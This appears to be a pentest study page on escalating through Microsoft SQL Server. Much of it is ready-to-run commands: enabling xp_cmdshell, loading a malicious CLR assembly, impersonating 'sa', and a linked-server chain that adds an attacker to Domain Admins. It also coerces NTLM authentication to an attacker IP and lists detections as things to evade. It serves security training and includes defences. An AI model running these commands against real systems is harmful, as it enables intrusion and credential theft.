---
title: MSSQL — xp_cmdshell and impersonation chains
slug: mssql-xp-cmdshell-impersonation-chains
aliases: [mssql-xp-cmdshell, mssql-impersonation]
---

{% raw %}

> **TL;DR:** Microsoft SQL Server is a privilege-escalation playground. Three primitives matter: (1) `xp_cmdshell` for direct OS command execution, (2) `EXECUTE AS` impersonation to inherit a sysadmin's permissions on the same instance, (3) **linked servers** to pivot from one instance to another (often into a domain controller's network). Combine them and a low-privileged SQL login becomes Domain Admin. OSEP loves this. Companion to [[mssql-trusted-links]] and [[mssql-enum]].

## Recon (you must do this first)

```bash
# Authenticated SQL enum with mssqlclient.py
impacket-mssqlclient DOMAIN/user:pass@10.10.10.5 -windows-auth

# Anonymous / SQL-auth?
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info 10.10.10.5

# Coerce NTLM via xp_dirtree (when you have any login but no exec)
EXEC master.dbo.xp_dirtree '\\10.10.14.5\share', 1, 1
```

Inside an MSSQL session, the orientation commands:

```sql
SELECT @@version;
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
SELECT name, principal_id FROM sys.server_principals;
-- am I impersonable on by anyone?
SELECT b.name AS GranteeName, a.name AS GrantorName
FROM sys.server_permissions p
JOIN sys.server_principals a ON p.grantor_principal_id = a.principal_id
JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id
WHERE p.permission_name = 'IMPERSONATE';
```

## Primitive 1 — xp_cmdshell

`xp_cmdshell` runs an OS command as the SQL Server service account.

```sql
-- enable (sysadmin required)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- shoot
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -e <b64>';
```

Service-account context matters:
- Default `NT Service\MSSQLSERVER` (virtual account, low priv on the host but may have SeImpersonate → see [[token-impersonation]] + Potato family).
- Domain account (best case) — instant network identity for further lateral movement.
- `LocalSystem` (legacy install) — instant SYSTEM.

If `xp_cmdshell` is disabled and you can't enable, fall back to:
- **OLE Automation procedures** (`sp_OACreate` → `WScript.Shell`).
- **CLR assembly load** — register a malicious .NET assembly inside SQL, call its method.
- **R / Python ML services** (`sp_execute_external_script`) — if enabled.

```sql
-- CLR load (sysadmin)
ALTER DATABASE master SET TRUSTWORTHY ON;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
CREATE ASSEMBLY [cmd_exec] FROM 0x4D5A...your DLL bytes... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @command nvarchar(4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];
EXEC dbo.cmd_exec 'whoami';
```

## Primitive 2 — EXECUTE AS impersonation

If a server-principal has been granted `IMPERSONATE` on another principal (especially `sa`), you can switch context:

```sql
-- Direct impersonation
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- → now sysadmin → enable xp_cmdshell
EXEC xp_cmdshell 'whoami';
REVERT;
```

Even better: find a high-priv login impersonating you by accident. Then re-impersonate inside a stored procedure:

```sql
-- Database-level
EXECUTE AS USER = 'dbo';
```

## Primitive 3 — linked servers

A linked server is a saved connection from instance A to instance B. If `rpcout` is on (or `data access` for older versions), you can run SQL on B as whatever credential A uses.

```sql
-- Discover
SELECT srvname, isremote FROM master..sysservers;
EXEC sp_linkedservers;

-- Run on the linked server
EXEC ('SELECT @@version;') AT [LINKED_SRV];

-- Chain through it
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LINKED_SRV];

-- Multi-hop chain
EXEC ('EXEC (''SELECT @@version;'') AT [HOP2];') AT [HOP1];
```

The chain works because each instance forwards the call using its own credentials. If `HOP1` connects to `HOP2` as `sa`, you don't need credentials for `HOP2` directly.

PowerUpSQL automates the discovery:
```powershell
Get-SQLServerLinkCrawl -Instance 'mssql01' -Verbose
```

## Putting it together — typical OSEP chain

1. **Foothold:** SQL auth `webapp / hunter2` discovered from a config file. `IS_SRVROLEMEMBER('sysadmin') = 0`. No `xp_cmdshell`.
2. **Impersonation:** enumerate `IMPERSONATE` grants → find that `sa` is impersonable.
3. `EXECUTE AS LOGIN = 'sa'` → now sysadmin → enable `xp_cmdshell`.
4. **Service account context:** `whoami` reveals `NT Service\MSSQL$INST1` — has `SeImpersonate`. Drop GodPotato or PrintSpoofer payload to escalate to `SYSTEM`.
5. **Linked server pivot:** discover `LINKED_DC` pointing at the DC's SQL instance with `sa` mapping.
6. `EXEC ('EXEC xp_cmdshell ''cmd /c net group "Domain Admins" attacker /add /domain'';') AT [LINKED_DC]`.
7. Domain Admin without ever leaving the MSSQL protocol.

## NTLM coercion via MSSQL

Several MSSQL functions take a file path and will reach out to a UNC. If you can run any of them, you can coerce the service account to authenticate to your responder.

```sql
EXEC master.dbo.xp_dirtree '\\10.10.14.5\x', 1, 1;
EXEC master.dbo.xp_subdirs '\\10.10.14.5\x';
EXEC master.dbo.xp_fileexist '\\10.10.14.5\x';
```

```bash
# attacker
sudo responder -I tun0
# capture NetNTLMv2 → hashcat -m 5600
```

If the service account is a domain user with `WriteAccountRestrictions` somewhere, this also enables NTLM relay chains — see [[ntlm-relay-ws2025-mitigations]].

## Detection (so you know what to dodge)

- `xp_cmdshell` enablement event (Event ID 15457 or sp_configure trace).
- Failed `EXECUTE AS` attempts on `sa`.
- Sudden new linked server entries.
- SQL Server agent running `cmd.exe` / `powershell.exe` children — surfaced by Microsoft Defender for SQL.

## Defence

- Disable `xp_cmdshell` and revoke `sp_configure` from non-sysadmin.
- Run MSSQL under a low-priv virtual account, not a domain admin.
- Avoid `TRUSTWORTHY ON` on user databases.
- Linked servers: don't store `sa` credentials; use Windows Auth pass-through *only when necessary*.
- Audit `IMPERSONATE` grants on `sa` and on database owners.

## References
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Scott Sutherland (NetSPI) — MSSQL series](https://www.netspi.com/blog/technical/network-penetration-testing/)
- [MSSQL CLR assembly attack walkthrough — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [Impacket mssqlclient.py](https://github.com/fortra/impacket)
- See also: [[mssql-trusted-links]], [[mssql-enum]], [[token-impersonation]], [[ntlm-relay-ws2025-mitigations]], [[osep-roadmap]]

{% endraw %}
